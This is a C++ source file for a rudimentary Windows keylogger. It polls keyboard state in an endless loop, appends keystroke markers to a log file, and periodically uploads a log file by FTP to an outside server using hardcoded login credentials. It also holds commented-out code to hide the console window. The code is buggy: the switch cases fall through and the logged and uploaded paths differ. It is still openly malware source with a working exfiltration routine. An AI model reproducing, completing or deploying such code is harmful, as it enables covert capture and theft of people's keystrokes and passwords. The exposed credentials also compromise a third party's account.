#define _WIN32_WINNT 0x0500
#include <iostream>
#include <fstream>
#include <windows.h>
#include <wininet.h>

using namespace std;

//string file = "C:\\Windows\\Temp\\log.txt";
//ios::app = append mode, o/p to that file appended to end
//ios::ate = open a file and move cursor to end
//ios::in = read mode
//ios::out = write mode
//ios::trunc = if file pre exists, it's content truncated before opening file

/*
int getfilesize(std::string fi){

    FILE *f;
    f = fopen(fi.c_str(), "r");
    fseek(f,0,SEEK_END);
    int size = ftell(f);
    cout<< "file size within function is  : "<<size<<endl;
    fclose(f);
    return size;
}
*/

/*
void upload(){

}
*/
int main()
{
    char c;
    //HWND h = GetConsoleWindow();
    //ShowWindow(h, SW_HIDE);
    for(;;){
            int i=0;
        for(c=8; c<=222; c++){
            if(GetAsyncKeyState(c)==-32767){
                i++;
                //C:\\Windows\\Temp\\log.txt
                ofstream write("C:\\Users\\Aayush Goyal\\Desktop\\log.txt", ios::app);
                switch(c){
                case 8:write << "<Backspace>";
                case 32:write << "<Space>";
                default:write << "<<--Invalid Character-->>" <<endl;
                //cout<< "file size is : "<<getfilesize("C:\\Windows\\Temp\\log.txt")<<endl;
                if(i>=10){
                        i=0;
                    //send file to ftp
                    HINTERNET internet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                    HINTERNET ftpSession = InternetConnect(internet, "ftp.gangapur.city", INTERNET_DEFAULT_FTP_PORT,
                                "bulwark@angelinfosolution.com", "Hello#321", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE,0);
                    FtpPutFile(ftpSession, "C:\\Windows\\Temp\\log.txt", "/test.txt", FTP_TRANSFER_TYPE_BINARY, 0);
                    std::cout << "File Uploaded." << std::endl;
                    InternetCloseHandle(ftpSession);
                    InternetCloseHandle(internet);
                }
                }

            }
        }
    }
    return 0;
}


